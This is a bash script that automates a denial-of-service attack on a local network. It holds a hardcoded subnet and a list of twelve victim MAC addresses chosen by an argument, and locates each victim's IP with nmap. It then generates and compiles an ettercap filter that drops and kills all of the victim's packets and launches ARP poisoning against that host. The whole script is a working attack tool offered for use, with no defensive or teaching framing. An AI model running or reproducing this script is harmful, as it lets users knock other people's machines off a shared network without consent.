#!/bin/bash

#   Auto run a D.O.S. attack
#   against a lan computer
#   using it mac address
#   2014.07.04

#   parameters :
#   1  2
#   3  4
#
#   5  6
#   7  8
#
#   9 10
#  11 12

#   local area network
LAN="115.155.46.0/25"

#   victim mac address
MAC=("" "b8:70:f4:4a:f4:ee" "e8:9a:8f:2f:e3:ef" "14:da:e9:61:0c:7e" "54:04:a6:ae:00:ec" "10:78:d2:6a:a0:28" "84:8f:69:d2:cb:4a" "f0:de:f1:5c:0c:4e" "b8:88:e3:7b:80:ce" "14:fe:b5:c4:1e:74" "ac:22:0b:d7:59:5c" "04:7d:7b:fb:84:19" "04:7d:7b:2d:13:45")
VICTIM_MAC=${MAC[$1]}
#   simply use nbtscan to find victim's IP information
#VICTIM_IP=`nbtscan -r $LAN | grep $VICTIM_MAC | cut -d" " -f1`

#   try to use nmap for a more reliable result
VICTIM_IP=`
  nmap -sn $LAN |
  grep -iB 2 $VICTIM_MAC |
  head -1 |
  awk -F " " '{print $NF}'
`

#   a much more reliable version use fping
#   2014.07.05
#update arp list first
#fping -g $LAN > /dev/null 2>&1
#VICTIM_IP=`
#  arp -a |
#  grep -i "$VICTIM_MAC" |
#  awk -F " " '{print $2}' |
#  sed 's/.*(//g;s/).*//g'
#`
##twice to make sure
##    2014.07.06
#VICTIM_IP=`
#  arp -a |
#  grep -i "$VICTIM_MAC" |
#  awk -F " " '{print $2}' |
#  sed 's/.*(//g;s/).*//g'
#`
if [ -z "$VICTIM_IP" ] ; then
    echo "[-] **************"
    echo "[-] victim is down"
    echo -n "[+] "
    date
    echo "[-] **************"
    exit 240
fi
echo "[+] ************"
echo "[+] victim is up"
echo -n "[+] "
date
echo "[+] ************"
VICTIM_IP_END=`echo $VICTIM_IP | cut -d"." -f4`
FILENAME_EF="DoS_$VICTIM_IP_END.ef"
FILENAME_EFT="DoS_$VICTIM_IP_END.eft"

#   check if the filter for ettercap exist
#   if the filter does not exist
#   create it
if [ ! -e "$FILENAME_EF" ] ; then
    echo "[-] $FILENAME_EF does not exist."
    echo "if ( ip.src == '$VICTIM_IP' || ip.dst == '$VICTIM_IP' )" > $FILENAME_EFT
    echo "{" >> $FILENAME_EFT
    echo "    drop() ;" >> $FILENAME_EFT
    echo "    kill() ;" >> $FILENAME_EFT
    echo "    msg( \"Packet $VICTIM_IP_END killed\\n\" ) ; " >> $FILENAME_EFT
    echo "}" >> $FILENAME_EFT
    etterfilter $FILENAME_EFT -o $FILENAME_EF
else
    echo "[+] $FILENAME_EF does exist."
fi

#   run a D.O.S attack
ettercap -T -q -F $FILENAME_EF -M ARP /$VICTIM_IP/ //
